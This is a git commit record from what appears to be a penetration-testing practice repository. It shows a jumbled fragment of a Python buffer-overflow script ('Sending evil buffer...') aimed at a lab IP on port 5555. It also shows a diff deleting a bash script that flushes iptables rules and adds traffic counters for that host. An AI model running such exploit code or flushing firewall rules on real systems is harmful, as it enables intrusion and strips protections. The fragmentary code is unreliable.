26f415d5bf59fc6eb2f4573a450bb89b89161a0a
root <root@localhost.localdomain>
2019-10-19 20:24:15 +0300

    -1     print "\nSending evil buffer..."     s.connect(('10.11.22.105' , 5555))     data = s.recv(1024)     s.send('USER username' + '\r\n')     data = s.recv(1024)

--- windows/iptables-counters.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-
-# reset all counters and iptables rules
-iptables -Z && iptables -F
-# measure incoming traffic to x.x.x.x
-iptables -I INPUT 1 -s 10.11.22.105 -j ACCEPT
-# measure outgoing traffic to x.x.x.x
-iptables -I OUTPUT 1 -d 10.11.22.105 -j ACCEPT
